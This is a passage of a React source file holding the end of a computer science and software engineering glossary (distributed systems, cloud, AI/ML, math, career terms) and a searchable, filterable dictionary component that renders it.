  { term: "Vector Clock / Logical Clock", category: "Distributed Systems", level: "Expert", definition: "A mechanism for tracking causality and ordering events in a distributed system where physical clocks can't be perfectly synchronized.", example: "Node A and Node B both update the same record. Vector clocks detect the conflict: A's update didn't see B's update, so they're concurrent — manual resolution needed." },
  { term: "Service Discovery", category: "Distributed Systems", level: "Advanced", definition: "The mechanism by which services find each other's network addresses in a dynamic environment where instances are constantly created and destroyed.", example: "Service A needs to call Service B, but B has 10 instances with dynamic IPs. Service discovery (Consul, Kubernetes DNS) tells A where B's instances are." },
  { term: "Gossip Protocol", category: "Distributed Systems", level: "Expert", definition: "A communication protocol where nodes periodically exchange information with random peers, spreading data like rumors in a social network.", example: "Node A knows 'Service X is healthy.' It tells random nodes B and C. They tell D and E. Within seconds, all 100 nodes know. Used by Cassandra, DynamoDB." },
  { term: "Consistent Hashing", category: "Distributed Systems", level: "Advanced", definition: "A hashing technique where adding or removing a server only requires remapping K/N keys (K=total keys, N=servers). Minimizes redistribution.", example: "With 4 cache servers, adding a 5th only moves ~20% of keys (not 100%). Essential for distributed caches and databases. Used by DynamoDB, Cassandra." },
  { term: "Two-Phase Commit (2PC)", category: "Distributed Systems", level: "Advanced", definition: "A protocol ensuring all nodes in a distributed transaction either commit or abort. Phase 1: coordinator asks 'ready to commit?' Phase 2: coordinator says 'commit' or 'abort'.", example: "Booking a flight + hotel: Phase 1: both services say 'ready.' Phase 2: coordinator says 'commit.' If either says 'not ready,' both abort." },
  { term: "Quorum", category: "Distributed Systems", level: "Advanced", definition: "The minimum number of nodes that must agree on an operation for it to be considered successful. In a cluster of N nodes, quorum is typically (N/2)+1.", example: "5-node cluster, quorum = 3. A write must be acknowledged by 3 nodes to succeed. If 2 nodes are down, writes still succeed. If 3 are down, writes fail — prevents split brain." },
  { term: "Backpressure", category: "Distributed Systems", level: "Advanced", definition: "A flow control mechanism where a downstream service signals upstream services to slow down when it's being overwhelmed.", example: "Message queue is filling up → producer is notified to slow down. Like a highway on-ramp meter light — controls flow to prevent gridlock (system overload)." },

  // ═══════════════════════════════════════════
  // CLOUD & SCALABILITY
  // ═══════════════════════════════════════════
  { term: "Cloud Computing", category: "Cloud & Scalability", level: "Foundational", definition: "On-demand access to computing resources (servers, storage, databases, networking) over the internet. Pay for what you use. No physical hardware management.", example: "Instead of buying $50,000 servers, rent them from AWS for $0.10/hour. Scale up during Black Friday, scale down after. AWS, GCP, Azure are the big three." },
  { term: "IaaS / PaaS / SaaS", category: "Cloud & Scalability", level: "Foundational", definition: "IaaS: rent infrastructure (VMs, storage). PaaS: rent platform (deploy code, provider manages OS/runtime). SaaS: use finished software (Gmail, Slack).", example: "IaaS: AWS EC2 (you manage OS, runtime, app). PaaS: Heroku (you deploy code, it manages everything else). SaaS: Google Docs (you just use it)." },
  { term: "AWS (Amazon Web Services)", category: "Cloud & Scalability", level: "Intermediate", definition: "The largest cloud platform with 200+ services. Key services: EC2 (compute), S3 (storage), RDS (managed database), Lambda (serverless), CloudFront (CDN).", example: "A typical AWS stack: CloudFront (CDN) → ALB (load balancer) → ECS (containers) → RDS (database) → S3 (file storage) → SQS (message queue)." },
  { term: "Auto-Scaling", category: "Cloud & Scalability", level: "Intermediate", definition: "Automatically adjusting the number of running instances based on demand. Scale out (add instances) when busy, scale in (remove) when idle.", example: "Normal: 3 servers. Black Friday: CPU hits 80% → auto-scale adds servers until CPU drops below 60%. After the sale: traffic drops → scale back to 3." },
  { term: "Elasticity", category: "Cloud & Scalability", level: "Intermediate", definition: "The ability of a system to dynamically adapt to workload changes by provisioning and de-provisioning resources automatically.", example: "A ticket-selling site: 100 users normally → scales to 100,000 during a concert launch → scales back to 100 after. No manual intervention." },
  { term: "Object Storage (S3)", category: "Cloud & Scalability", level: "Intermediate", definition: "Storing data as objects (file + metadata) in a flat namespace. Highly durable, scalable, and cheap. Not a file system — no directories, just keys.", example: "Store user profile photos in S3: key = 'users/42/avatar.jpg'. 99.999999999% (11 nines) durability. Virtually unlimited storage. Pennies per GB/month." },
  { term: "Containerization", category: "Cloud & Scalability", level: "Intermediate", definition: "Packaging an application and its dependencies into a lightweight, portable container. More efficient than VMs — shares the host OS kernel.", example: "Docker container: your Node.js app + node_modules + exact Node version. Runs identically on any machine with Docker. 10x lighter than a VM." },
  { term: "Terraform / CloudFormation", category: "Cloud & Scalability", level: "Intermediate", definition: "IaC tools for provisioning cloud infrastructure. Terraform: multi-cloud, uses HCL. CloudFormation: AWS-only, uses JSON/YAML.", example: "Terraform: resource 'aws_s3_bucket' 'photos' { bucket = 'user-photos' }. Run terraform apply — bucket created. Run terraform destroy — bucket removed. Version-controlled infrastructure." },
  { term: "Multi-Region Deployment", category: "Cloud & Scalability", level: "Advanced", definition: "Deploying your application across multiple geographic regions for lower latency and higher availability. If one region goes down, others continue serving.", example: "Deploy in US-East, EU-West, and AP-Southeast. Users are routed to the nearest region. If US-East has an outage, traffic shifts to EU-West automatically." },
  { term: "Spot / Preemptible Instances", category: "Cloud & Scalability", level: "Advanced", definition: "Discounted cloud compute instances that can be reclaimed by the provider with short notice. 60-90% cheaper than on-demand. Good for fault-tolerant workloads.", example: "Run your batch data processing on spot instances — 70% cheaper. If instances are reclaimed, the job resumes on new instances. Not suitable for user-facing servers." },
  { term: "Edge Computing", category: "Cloud & Scalability", level: "Advanced", definition: "Processing data near the source (edge of the network) instead of sending everything to a central cloud. Reduces latency and bandwidth.", example: "Self-driving cars process sensor data locally (can't wait for cloud round-trip). CDN edge functions (Cloudflare Workers) run code near users for <10ms latency." },

  // ═══════════════════════════════════════════
  // AI / ML FOUNDATIONS
  // ═══════════════════════════════════════════
  { term: "Machine Learning (ML)", category: "AI / ML Foundations", level: "Foundational", definition: "A subset of AI where systems learn from data to improve performance on a task without being explicitly programmed. Learns patterns, makes predictions.", example: "Instead of writing rules for spam detection (if contains 'viagra'...), feed the ML model 10,000 spam and 10,000 non-spam emails. It learns the patterns itself." },
  { term: "Supervised Learning", category: "AI / ML Foundations", level: "Foundational", definition: "Learning from labeled data — each training example has an input AND the correct output (label). The model learns to map inputs to outputs.", example: "Training data: (photo of cat, 'cat'), (photo of dog, 'dog'). Model learns features that distinguish cats from dogs. Given a new photo, it predicts the label." },
  { term: "Unsupervised Learning", category: "AI / ML Foundations", level: "Foundational", definition: "Learning from unlabeled data — the model finds hidden patterns, structures, or groupings without being told what to look for.", example: "Given 10,000 customer purchase histories with no labels, the model discovers 5 customer segments: 'budget shoppers', 'luxury buyers', 'tech enthusiasts', etc." },
  { term: "Reinforcement Learning (RL)", category: "AI / ML Foundations", level: "Intermediate", definition: "An agent learns by interacting with an environment, receiving rewards for good actions and penalties for bad ones. Learns optimal strategies through trial and error.", example: "Training an AI to play chess: it plays thousands of games, receiving +1 for wins, -1 for losses. Over time, it learns winning strategies without being taught rules." },
  { term: "Neural Network", category: "AI / ML Foundations", level: "Intermediate", definition: "A computing model inspired by biological neurons. Layers of interconnected nodes (neurons) that learn to transform inputs into outputs through weighted connections.", example: "Input layer (pixels of image) → hidden layers (learn edges, shapes, objects) → output layer (cat, dog, car). Each layer learns increasingly abstract features." },
  { term: "Deep Learning", category: "AI / ML Foundations", level: "Intermediate", definition: "Machine learning using neural networks with many layers (deep). Excels at learning complex patterns from large datasets. Powers modern AI breakthroughs.", example: "GPT, DALL-E, AlphaGo — all deep learning. A 100-layer network can learn hierarchical representations that a 2-layer network can't." },
  { term: "Overfitting / Underfitting", category: "AI / ML Foundations", level: "Intermediate", definition: "Overfitting: model learns training data too well (including noise) and fails on new data. Underfitting: model is too simple to capture the pattern.", example: "Overfitting: memorizing every exam question but can't solve new ones. Underfitting: studying too little and can't solve any. Sweet spot: generalizing from principles." },
  { term: "Training / Inference", category: "AI / ML Foundations", level: "Foundational", definition: "Training: the process of learning from data (computationally expensive, done once/periodically). Inference: using the trained model to make predictions (fast, done continuously).", example: "Training GPT-4 took months on thousands of GPUs. Inference: you type a prompt and get a response in 2 seconds. Training is the education; inference is the exam." },
  { term: "Gradient Descent", category: "AI / ML Foundations", level: "Intermediate", definition: "An optimization algorithm that iteratively adjusts model parameters to minimize a loss function. Follows the steepest downward slope to find the minimum.", example: "Imagine you're blindfolded on a hill. You feel the slope, step downhill, repeat. Eventually you reach the valley (minimum loss). Learning rate = step size." },
  { term: "Transformer Architecture", category: "AI / ML Foundations", level: "Advanced", definition: "A neural network architecture using self-attention mechanisms to process sequential data in parallel. Foundation of GPT, BERT, and modern LLMs.", example: "Unlike RNNs that process words one-by-one, transformers process all words simultaneously and learn which words to 'attend to.' 'The cat sat on the mat' — 'sat' attends to 'cat'." },
  { term: "Large Language Model (LLM)", category: "AI / ML Foundations", level: "Intermediate", definition: "A massive neural network trained on vast text data to understand and generate human language. Predicts the next token based on context.", example: "GPT-4, Claude, Gemini — trained on trillions of words. Given a prompt, they generate coherent, contextually appropriate text by predicting the most likely next words." },
  { term: "Fine-Tuning", category: "AI / ML Foundations", level: "Intermediate", definition: "Adapting a pre-trained model to a specific task by training it further on a smaller, task-specific dataset.", example: "Take GPT → fine-tune on legal documents → LegalGPT that writes better contracts. The base model provides general language understanding; fine-tuning adds domain expertise." },
  { term: "RAG (Retrieval-Augmented Generation)", category: "AI / ML Foundations", level: "Advanced", definition: "Combining a retrieval system (search engine) with a generative model (LLM). The model retrieves relevant documents and uses them to generate informed responses.", example: "User asks about company policy. RAG system: (1) searches company knowledge base, (2) retrieves relevant docs, (3) LLM generates answer using those docs as context." },
  { term: "Embedding", category: "AI / ML Foundations", level: "Intermediate", definition: "Converting data (text, images) into dense numerical vectors that capture semantic meaning. Similar items have similar vectors.", example: "'king' and 'queen' have similar embeddings. 'king' - 'man' + 'woman' ≈ 'queen'. Enables semantic search, recommendations, and clustering." },
  { term: "Prompt Engineering", category: "AI / ML Foundations", level: "Intermediate", definition: "The art and science of crafting effective prompts to get desired outputs from LLMs. Includes techniques like few-shot examples, chain-of-thought, and system prompts.", example: "Bad: 'Write code.' Good: 'Write a Python function that takes a list of integers and returns the top 3 largest. Include error handling and type hints.'" },
  { term: "Hallucination (AI)", category: "AI / ML Foundations", level: "Intermediate", definition: "When an AI model generates confident-sounding but factually incorrect or fabricated information. A fundamental limitation of current LLMs.", example: "Ask an LLM for a research paper citation — it may generate a real-looking but completely nonexistent paper with fake authors, journals, and DOIs." },
  { term: "Token (NLP)", category: "AI / ML Foundations", level: "Intermediate", definition: "The basic unit of text processed by a language model. Can be a word, subword, or character depending on the tokenizer.", example: "'unhappiness' might be tokenized as ['un', 'happiness'] or ['un', 'happi', 'ness']. GPT-4 has a context window of ~128K tokens (~96,000 words)." },

  // ═══════════════════════════════════════════
  // MATH & THEORY
  // ═══════════════════════════════════════════
  { term: "Boolean Algebra", category: "Math & Theory", level: "Foundational", definition: "Mathematics of true/false values. Operations: AND (both true), OR (at least one true), NOT (flip). Foundation of digital logic and programming conditions.", example: "(isLoggedIn AND hasPermission) OR isAdmin — evaluates whether a user can access a resource. All computer circuits are built on these three operations." },
  { term: "Set Theory", category: "Math & Theory", level: "Foundational", definition: "Branch of math dealing with collections of objects. Operations: union (combine), intersection (common elements), difference (in A but not B).", example: "Users who bought shoes AND who bought shirts = intersection (cross-sell target). SQL uses set operations: UNION, INTERSECT, EXCEPT." },
  { term: "Graph Theory", category: "Math & Theory", level: "Intermediate", definition: "The study of graphs — mathematical structures modeling pairwise relationships. Covers paths, cycles, connectivity, coloring, flow networks.", example: "Social networks, internet routing, circuit design, scheduling problems, map coloring — all modeled and solved using graph theory." },
  { term: "Probability & Statistics", category: "Math & Theory", level: "Intermediate", definition: "Probability: likelihood of events. Statistics: collecting, analyzing, and interpreting data. Foundation of ML, A/B testing, and decision-making.", example: "A/B test: version A converts 4.2%, version B converts 4.8%. Is B actually better, or is it random chance? Statistics (p-value, confidence interval) answers this." },
  { term: "Linear Algebra", category: "Math & Theory", level: "Intermediate", definition: "The study of vectors, matrices, and linear transformations. Foundation of computer graphics, ML, physics simulations, and data science.", example: "Neural networks are essentially matrix multiplications. 3D game graphics transform vertex positions using 4×4 matrices. Principal Component Analysis uses eigenvectors." },
  { term: "Discrete Mathematics", category: "Math & Theory", level: "Intermediate", definition: "Math of discrete (non-continuous) structures: logic, sets, combinatorics, graph theory, number theory. The mathematical foundation of computer science.", example: "How many different passwords of length 8 using 62 characters? 62⁸ ≈ 218 trillion. Combinatorics tells you this without listing them all." },
  { term: "Automata Theory", category: "Math & Theory", level: "Advanced", definition: "Study of abstract computational machines (automata). Finite automata, pushdown automata, and Turing machines — each with increasing computational power.", example: "Regex engines use finite automata. Programming language parsers use pushdown automata. Turing machines are theoretical models of any computer — defines what's computable." },
  { term: "Turing Machine / Turing Completeness", category: "Math & Theory", level: "Intermediate", definition: "A Turing Machine is an abstract model of computation that can solve any computable problem. A language is Turing-complete if it can simulate a Turing Machine.", example: "Python, JavaScript, even PowerPoint's animation system are Turing-complete — they can compute anything computable (given enough time and memory)." },
  { term: "P vs NP Problem", category: "Math & Theory", level: "Advanced", definition: "P: problems solvable quickly. NP: problems verifiable quickly. Does P = NP? Can every problem whose solution is quickly verifiable also be quickly solved? Unsolved — $1M prize.", example: "Sudoku: solving is hard (NP), but checking a solved puzzle is easy (P). If P=NP, we could solve Sudoku as fast as we check it. Most believe P≠NP." },
  { term: "Computational Complexity", category: "Math & Theory", level: "Advanced", definition: "Classifying problems by the resources (time, space) needed to solve them. Complexity classes: P, NP, NP-complete, NP-hard, PSPACE, EXPTIME.", example: "Sorting is in P (polynomial time — efficient). Traveling Salesman decision version is NP-complete (no known efficient algorithm). This classification guides algorithm design." },
  { term: "Information Theory", category: "Math & Theory", level: "Advanced", definition: "The mathematical study of information: quantifying, storing, and communicating data. Entropy measures uncertainty/information content.", example: "A fair coin flip has 1 bit of entropy (maximum uncertainty between 2 outcomes). Data compression exploits low-entropy patterns — repeated text compresses more." },
  { term: "Logarithm", category: "Math & Theory", level: "Foundational", definition: "The inverse of exponentiation. log₂(N) answers: 'how many times do I halve N to reach 1?' Appears constantly in algorithm analysis.", example: "log₂(1024) = 10. Binary search of 1024 items takes at most 10 comparisons. That's why O(log n) algorithms are so fast — doubling data only adds 1 step." },

  // ═══════════════════════════════════════════
  // CAREER & PROFESSIONAL
  // ═══════════════════════════════════════════
  { term: "Junior / Mid / Senior / Staff / Principal Engineer", category: "Career & Professional", level: "Foundational", definition: "Career levels in software engineering. Junior: learning, guided work. Mid: independent contributor. Senior: leads projects, mentors. Staff/Principal: org-wide technical leadership.", example: "Junior: implements assigned tasks with guidance. Senior: designs systems, mentors juniors, unblocks the team. Staff: defines technical strategy across multiple teams." },
  { term: "T-Shaped Engineer", category: "Career & Professional", level: "Intermediate", definition: "A developer with deep expertise in one area (the vertical bar of T) and broad knowledge across many areas (the horizontal bar).", example: "Deep in backend systems (vertical), but understands frontend, DevOps, databases, security, and product thinking (horizontal). Can collaborate across the entire stack." },
  { term: "System Design Interview", category: "Career & Professional", level: "Intermediate", definition: "An interview where candidates design a large-scale system (URL shortener, chat app, news feed). Tests architectural thinking, tradeoffs, and communication.", example: "Design Twitter: discuss requirements → estimate scale → design high-level architecture → deep-dive into timeline service → discuss tradeoffs and bottlenecks." },
  { term: "Open Source Software (OSS)", category: "Career & Professional", level: "Foundational", definition: "Software whose source code is publicly available for anyone to use, modify, and distribute. Often community-driven.", example: "Linux, React, Python, PostgreSQL, Kubernetes — all open source. Companies build billion-dollar products on top of free open-source software." },
  { term: "Leetcode / DSA Interview", category: "Career & Professional", level: "Foundational", definition: "Technical interviews testing data structures and algorithms problem-solving ability. Companies like Google, Meta, Amazon use these extensively.", example: "Given a string, find the longest substring without repeating characters. You need to identify it as a sliding window problem, code it, and analyze time/space complexity." },
  { term: "RFC (Request for Comments)", category: "Career & Professional", level: "Intermediate", definition: "A document proposing a technical decision, design, or process change. Circulated for team feedback before implementation. Internal RFC or internet standards RFC.", example: "Before migrating from REST to GraphQL, write an RFC: problem statement, proposed solution, alternatives considered, migration plan. Team reviews and comments." },
  { term: "Blameless Culture", category: "Career & Professional", level: "Intermediate", definition: "An organizational culture where failures are treated as learning opportunities, not blame assignments. Focus on systemic improvements, not individual fault.", example: "Server went down because someone deployed a bad config. Instead of 'who did this?', ask 'why did our system allow deploying a bad config without validation?'" },
  { term: "On-Call", category: "Career & Professional", level: "Foundational", definition: "A rotation where engineers are available to respond to production incidents outside business hours. Typically week-long shifts with escalation procedures.", example: "You're on-call this week. At 2 AM, PagerDuty alerts you: 'Payment service latency > 5s.' You investigate, mitigate, and write a follow-up for the team." },
  { term: "Tech Stack", category: "Career & Professional", level: "Foundational", definition: "The combination of technologies used to build and run an application. Includes frontend, backend, database, infrastructure, and tools.", example: "MERN stack: MongoDB (database), Express (backend framework), React (frontend), Node.js (runtime). Other examples: LAMP, JAMstack, Django+PostgreSQL+React." },
];

// ─────── APP COMPONENT ───────
export default function CSDictionary() {
  const [search, setSearch] = useState("");
  const [selectedCategory, setSelectedCategory] = useState("All");
  const [selectedLevel, setSelectedLevel] = useState("All");
  const [expandedTerm, setExpandedTerm] = useState(null);
  const [viewMode, setViewMode] = useState("cards");
  const scrollRef = useRef(null);

  const filtered = useMemo(() => {
    return dictionary.filter((item) => {
      const matchesSearch =
        search === "" ||
        item.term.toLowerCase().includes(search.toLowerCase()) ||
        item.definition.toLowerCase().includes(search.toLowerCase()) ||
        item.example.toLowerCase().includes(search.toLowerCase());
      const matchesCategory =
        selectedCategory === "All" || item.category === selectedCategory;
      const matchesLevel =
        selectedLevel === "All" || item.level === selectedLevel;
      return matchesSearch && matchesCategory && matchesLevel;
    });
  }, [search, selectedCategory, selectedLevel]);

  const stats = useMemo(() => {
    const byCat = {};
    const byLevel = {};
    dictionary.forEach((d) => {
      byCat[d.category] = (byCat[d.category] || 0) + 1;
      byLevel[d.level] = (byLevel[d.level] || 0) + 1;
    });
    return { byCat, byLevel, total: dictionary.length };
  }, []);

  const grouped = useMemo(() => {
    const g = {};
    filtered.forEach((item) => {
      if (!g[item.category]) g[item.category] = [];
      g[item.category].push(item);
    });
    return g;
  }, [filtered]);

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#09090b",
        color: "#e4e4e7",
        fontFamily: "'IBM Plex Mono', 'JetBrains Mono', 'Fira Code', monospace",
      }}
    >
      {/* HEADER */}
      <div
        style={{
          background: "linear-gradient(135deg, #18181b 0%, #09090b 50%, #1a1a2e 100%)",
          borderBottom: "1px solid #27272a",
          padding: "32px 24px 24px",
        }}
      >
        <div style={{ maxWidth: 1200, margin: "0 auto" }}>
          <div style={{ display: "flex", alignItems: "baseline", gap: 12, marginBottom: 4 }}>
            <h1
              style={{
                fontSize: 28,
                fontWeight: 700,
                color: "#f4f4f5",
                letterSpacing: "-0.5px",
                margin: 0,
                fontFamily: "'Space Grotesk', 'IBM Plex Sans', system-ui, sans-serif",
              }}
            >
              CS × SE Dictionary
            </h1>
            <span style={{ fontSize: 13, color: "#71717a" }}>v1.0</span>
          </div>
          <p style={{ fontSize: 13, color: "#a1a1aa", margin: "4px 0 20px", maxWidth: 600 }}>
            {stats.total} terms across {CATEGORIES.length} domains — from first principles to expert-level system design.
            Built for Bloom's Taxonomy Level 1: Remember.
          </p>

          {/* STATS BAR */}
          <div style={{ display: "flex", gap: 16, flexWrap: "wrap", marginBottom: 20 }}>
            {LEVELS.map((l) => (
              <div
                key={l}
                style={{
                  padding: "6px 14px",
                  borderRadius: 6,
                  background: LEVEL_COLORS[l].bg,
                  border: `1px solid ${LEVEL_COLORS[l].border}`,
                  fontSize: 12,
                  color: LEVEL_COLORS[l].text,
                  fontWeight: 600,
                }}
              >
                {l}: {stats.byLevel[l] || 0}
              </div>
            ))}
          </div>

          {/* SEARCH */}
          <div style={{ position: "relative", marginBottom: 16 }}>
            <input
              type="text"
              placeholder="Search terms, definitions, or examples..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              style={{
                width: "100%",
                padding: "12px 16px 12px 42px",
                background: "#18181b",
                border: "1px solid #3f3f46",
                borderRadius: 8,
                color: "#f4f4f5",
                fontSize: 14,
                outline: "none",
                fontFamily: "inherit",
                boxSizing: "border-box",
              }}
            />
            <span
              style={{
                position: "absolute",
                left: 14,
                top: "50%",
                transform: "translateY(-50%)",
                fontSize: 16,
                color: "#71717a",
              }}
            >
              ⌕
            </span>
          </div>

          {/* FILTERS */}
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <select
              value={selectedCategory}
              onChange={(e) => setSelectedCategory(e.target.value)}
              style={{
                padding: "8px 12px",
                background: "#18181b",
                border: "1px solid #3f3f46",
                borderRadius: 6,
                color: "#e4e4e7",
                fontSize: 13,
                fontFamily: "inherit",
                cursor: "pointer",
              }}
            >
              <option value="All">All Categories ({stats.total})</option>
              {CATEGORIES.map((c) => (
                <option key={c} value={c}>
                  {CATEGORY_ICONS[c]} {c} ({stats.byCat[c] || 0})
                </option>
              ))}
            </select>
            <select
              value={selectedLevel}
              onChange={(e) => setSelectedLevel(e.target.value)}
              style={{
                padding: "8px 12px",
                background: "#18181b",
                border: "1px solid #3f3f46",
                borderRadius: 6,
                color: "#e4e4e7",
                fontSize: 13,
                fontFamily: "inherit",
                cursor: "pointer",
              }}
            >
              <option value="All">All Levels</option>
              {LEVELS.map((l) => (
                <option key={l} value={l}>
                  {l} ({stats.byLevel[l] || 0})
                </option>
              ))}
            </select>
            <div style={{ marginLeft: "auto", display: "flex", gap: 4 }}>
              {["cards", "compact"].map((m) => (
                <button
                  key={m}
                  onClick={() => setViewMode(m)}
                  style={{
                    padding: "6px 14px",
                    background: viewMode === m ? "#3f3f46" : "transparent",
                    border: "1px solid #3f3f46",
                    borderRadius: 6,
                    color: viewMode === m ? "#f4f4f5" : "#71717a",
                    fontSize: 12,
                    cursor: "pointer",
                    fontFamily: "inherit",
                    textTransform: "capitalize",
                  }}
                >
                  {m}
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* RESULTS */}
      <div style={{ maxWidth: 1200, margin: "0 auto", padding: "24px" }} ref={scrollRef}>
        <p style={{ fontSize: 13, color: "#71717a", marginBottom: 16 }}>
          Showing {filtered.length} of {stats.total} terms
        </p>

        {Object.entries(grouped).map(([cat, items]) => (
          <div key={cat} style={{ marginBottom: 32 }}>
            <h2
              style={{
                fontSize: 16,
                fontWeight: 700,
                color: "#d4d4d8",
                margin: "0 0 12px",
                display: "flex",
                alignItems: "center",
                gap: 8,
                fontFamily: "'Space Grotesk', 'IBM Plex Sans', system-ui, sans-serif",
              }}
            >
              <span style={{ fontSize: 20 }}>{CATEGORY_ICONS[cat]}</span> {cat}
              <span
                style={{
                  fontSize: 11,
                  color: "#71717a",
                  fontWeight: 400,
                  marginLeft: 4,
                }}
              >
                {items.length} terms
              </span>
            </h2>

            {viewMode === "cards" ? (
              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "repeat(auto-fill, minmax(340px, 1fr))",
                  gap: 10,
                }}
              >
                {items.map((item, i) => {
                  const isExpanded = expandedTerm === `${cat}-${i}`;
                  const lc = LEVEL_COLORS[item.level];
                  return (
                    <div
                      key={i}
                      onClick={() =>
                        setExpandedTerm(isExpanded ? null : `${cat}-${i}`)
                      }
                      style={{
                        background: "#18181b",
                        border: `1px solid ${isExpanded ? lc.border : "#27272a"}`,
                        borderRadius: 8,
                        padding: "14px 16px",
                        cursor: "pointer",
                        transition: "border-color 0.2s",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "flex-start",
                          marginBottom: 6,
                        }}
                      >
                        <h3
                          style={{
                            fontSize: 14,
                            fontWeight: 700,
                            color: "#f4f4f5",
                            margin: 0,
                            lineHeight: 1.3,
                            flex: 1,
                          }}
                        >
                          {item.term}
                        </h3>
                        <span
                          style={{
                            fontSize: 10,
                            padding: "2px 8px",
                            borderRadius: 4,
                            background: lc.bg,
                            color: lc.text,
                            fontWeight: 600,
                            whiteSpace: "nowrap",
                            marginLeft: 8,
                          }}
                        >
                          {item.level}
                        </span>
                      </div>
                      <p
                        style={{
                          fontSize: 12,
                          color: "#a1a1aa",
                          lineHeight: 1.6,
                          margin: 0,
                        }}
                      >
                        {isExpanded
                          ? item.definition
                          : item.definition.length > 120
                          ? item.definition.slice(0, 120) + "..."
                          : item.definition}
                      </p>
                      {isExpanded && (
                        <div
                          style={{
                            marginTop: 10,
                            padding: "10px 12px",
                            background: "#0f0f12",
                            borderRadius: 6,
                            borderLeft: `3px solid ${lc.text}`,
                          }}
                        >
                          <span
                            style={{
                              fontSize: 10,
                              color: lc.text,
                              fontWeight: 700,
                              textTransform: "uppercase",
                              letterSpacing: 1,
                            }}
                          >
                            Real-World Example
                          </span>
                          <p
                            style={{
                              fontSize: 12,
                              color: "#d4d4d8",
                              lineHeight: 1.6,
                              margin: "6px 0 0",
                            }}
                          >
                            {item.example}
                          </p>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            ) : (
              <div
                style={{
                  background: "#18181b",
                  border: "1px solid #27272a",
                  borderRadius: 8,
                  overflow: "hidden",
                }}
              >
                {items.map((item, i) => {
                  const lc = LEVEL_COLORS[item.level];
                  const isExpanded = expandedTerm === `${cat}-${i}`;
                  return (
                    <div
                      key={i}
                      onClick={() =>
                        setExpandedTerm(isExpanded ? null : `${cat}-${i}`)
                      }
                      style={{
                        padding: "10px 16px",
                        borderBottom:
                          i < items.length - 1 ? "1px solid #27272a" : "none",
                        cursor: "pointer",
                        transition: "background 0.15s",
                        background: isExpanded ? "#1c1c22" : "transparent",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 12,
                        }}
                      >
                        <span
                          style={{
                            fontSize: 9,
                            padding: "2px 6px",
                            borderRadius: 3,
                            background: lc.bg,
                            color: lc.text,
                            fontWeight: 700,
                            minWidth: 70,
                            textAlign: "center",
                          }}
                        >
                          {item.level}
                        </span>
                        <span
                          style={{
                            fontSize: 13,
                            fontWeight: 600,
                            color: "#f4f4f5",
                          }}
                        >
                          {item.term}
                        </span>
                        <span
                          style={{
                            fontSize: 12,
                            color: "#71717a",
                            flex: 1,
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                            whiteSpace: isExpanded ? "normal" : "nowrap",
                          }}
                        >
                          — {item.definition}
                        </span>
                      </div>
                      {isExpanded && (
                        <div
                          style={{
                            marginTop: 8,
                            marginLeft: 86,
                            padding: "8px 12px",
                            background: "#0f0f12",
                            borderRadius: 6,
                            borderLeft: `3px solid ${lc.text}`,
                          }}
                        >
                          <span
                            style={{
                              fontSize: 10,
                              color: lc.text,
                              fontWeight: 700,
                              textTransform: "uppercase",
                              letterSpacing: 1,
                            }}
                          >
                            Example
                          </span>
                          <p
                            style={{
                              fontSize: 12,
                              color: "#d4d4d8",
                              lineHeight: 1.6,
                              margin: "4px 0 0",
                            }}
                          >
                            {item.example}
                          </p>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        ))}

        {filtered.length === 0 && (
          <div
            style={{
              textAlign: "center",
              padding: "60px 20px",
              color: "#71717a",
            }}
          >
            <p style={{ fontSize: 32, marginBottom: 8 }}>∅</p>
            <p style={{ fontSize: 14 }}>
              No terms match your search. Try adjusting filters.
            </p>
          </div>
        )}

        {/* FOOTER */}
        <div
          style={{
            textAlign: "center",
            padding: "40px 20px",
            borderTop: "1px solid #27272a",
            marginTop: 40,
            color: "#52525b",
            fontSize: 11,
          }}
        >
          CS × SE Dictionary — {stats.total} terms across {CATEGORIES.length}{" "}
          domains — Bloom's Taxonomy Level 1: Remember
          <br />
          Click any card to expand and see real-world examples
        </div>
      </div>
    </div>
  );
}
